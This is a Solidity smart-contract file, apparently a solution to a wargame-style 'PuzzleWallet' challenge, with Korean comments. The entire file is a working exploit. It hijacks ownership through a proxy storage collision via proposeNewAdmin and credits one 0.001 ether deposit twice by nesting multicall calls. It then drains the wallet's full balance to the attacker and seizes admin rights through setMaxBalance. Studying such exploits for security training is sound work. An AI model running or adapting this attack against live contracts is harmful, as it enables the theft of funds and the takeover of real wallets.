// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IPuzzleProxy {
    function proposeNewAdmin(address) external;
}

interface IPuzzleWallet {
    function balances(address) external view returns (uint256);

    function addToWhitelist(address) external;

    function deposit() external payable;

    function execute(address to, uint256 value, bytes calldata data) external payable;

    function multicall(bytes[] calldata data) external payable;

    function setMaxBalance(uint256) external;
}

contract PuzzleWalletAttack {
    address immutable _owner;
    address immutable _target; // $LV: PuzzleProxy
    bytes[] _dataMulticall;

    constructor(address target) {
        _owner = msg.sender;
        _target = target;
    }

    function attack() external payable {
        require(msg.value == 0.001 ether);
        // 권한 우회
        IPuzzleProxy(_target).proposeNewAdmin(address(this));
        IPuzzleWallet(_target).addToWhitelist(address(this));
        // reentrancy attack을 통해 잔고 0으로 만들기
        _balanceToZero();
        // 권한 탈취
        IPuzzleWallet(_target).setMaxBalance(uint256(uint160(tx.origin)));
    }

    /// @dev multicall을 통해 [deposit, multicall[deposit]]을 수행하면 최초 multicall을 통해 0.001 ether이 전달된 상태에서 2번의 deposit을 수행할 수 있다.
    function _balanceToZero() internal {
        bytes memory argsDeposit = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);

        _dataMulticall.push(argsDeposit);

        bytes memory subArgsMulticall = abi.encodeWithSelector(
            IPuzzleWallet.multicall.selector,
            _dataMulticall // deposit only
        );

        _dataMulticall.push(subArgsMulticall);

        bytes memory mainArgsMulticall = abi.encodeWithSelector(
            IPuzzleWallet.multicall.selector,
            _dataMulticall // deposit, multicall[deposit]
        );

        (bool res,) = _target.call{value: 0.001 ether}(mainArgsMulticall);

        require(res && IPuzzleWallet(_target).balances(address(this)) >= _target.balance);

        IPuzzleWallet(_target).execute(_owner, _target.balance, "");
    }
}
